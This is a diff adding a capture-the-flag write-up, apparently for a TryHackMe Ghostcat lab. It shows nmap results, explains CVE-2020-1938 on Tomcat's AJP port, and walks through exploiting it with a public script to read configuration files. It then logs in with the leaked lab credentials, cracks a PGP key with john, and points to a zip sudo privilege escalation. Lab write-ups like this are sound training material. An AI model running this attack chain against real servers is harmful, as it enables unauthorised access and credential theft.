@@ -1,0 +1,88 @@
+# Nmap Scan results.
+
+
+--------------------------------------------------------------
+# Nmap 7.91 scan initiated Sun Jan  3 19:21:12 2021 as: nmap -sV -sC -T4 -p- -A -oN ghostcat.txt 10.10.190.139
+Warning: 10.10.190.139 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.190.139
+Host is up (0.33s latency).
+Not shown: 65520 closed ports
+PORT      STATE    SERVICE    VERSION
+22/tcp    open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
+|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
+|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
+53/tcp    open     tcpwrapped
+8009/tcp  open     ajp13      Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp  open     http       Apache Tomcat 9.0.30
+|_http-favicon: Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat/9.0.30
+17011/tcp filtered unknown
+18825/tcp filtered unknown
+22070/tcp filtered unknown
+24055/tcp filtered unknown
+27855/tcp filtered unknown
+35015/tcp filtered unknown
+35350/tcp filtered unknown
+41464/tcp filtered unknown
+43962/tcp filtered unknown
+44859/tcp filtered unknown
+45984/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jan  3 19:40:44 2021 -- 1 IP address (1 host up) scanned in 1172.61 seconds
+
+
+
+
+--------------------------------------------------------------
+
+8009/tcp  open     ajp13 : This seems to be an interesting find.
+
+Apache JServ Protocol (AJP) is used for communication between Tomcat and Apache web server. This protocol is binary and is enabled by default. Anytime the web server is started, AJP protocol is started on port 8009. It is primarily used as a reverse proxy to communicate with application servers.
+
+The Chinese cyber security company Chaitin Tech discovered the vulnerability, named “Ghostcat”, which is tracked using CVE-2020-1938 and rated critical severity with a CVSS v3 score of 9.8.
+
+Exploitability.
+
+With this vulnerability, an attacker can easily gain access to configuration files if the protocol is publicly available. If arbitrary file upload is not disabled, it is then possible for the attacker to upload malicious code to the web server that enables remote code execution.
+
+Methodology.
+
+So a little google search on an appropriate exploit lands us on Github: https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
+
+Run the command:
+>python3 ajpShooter.py http://<victim IP>:8080/ 8009 /WEB-INF/web.xml read
+
+> This gives us a username and passwd: skyfuck:8730281lkjlkjdqlksalks
+>ssh into the machine using the credentials obtaine.
+
+>Two files on the home dir: credential.pgp and tryhackme.asc
+
+> we'll just grab both files to our local system
+scp username@<victim IP>:/home/username/* .
+
+>Now use gpg2john to convert the tryhackme.asc file.
+sudo gpg2john tryhackme.asc > hashes
+
+>john --wordlist=/opt/rockyou.txt hashes
+
+gpg --import tryhackme.asc [use the passwd cracked from john]
+
+gpg --decrypt credential.pgp
+
+>we find a user name annd a passwd.
+
+
+PRIVESC.
+
+sudo -l
+
+>privesc vector is through the /usr/bin/zip
+
+>GTFObins, look for zip privesc vector
